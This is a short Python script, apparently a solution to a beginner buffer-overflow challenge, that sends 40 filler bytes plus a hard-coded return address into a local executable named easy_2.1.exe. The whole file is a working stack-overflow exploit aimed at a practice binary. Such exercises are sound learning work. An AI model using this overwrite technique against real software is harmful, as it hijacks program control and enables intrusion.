from subprocess import PIPE, Popen

payload = b"a"*40 + b"\x60\x13\x62\xe2\xf6\x7f\x00\x00"

p1 = Popen("easy\\easy_2.1.exe", stdin=PIPE)
p1.communicate(payload)
p1.wait()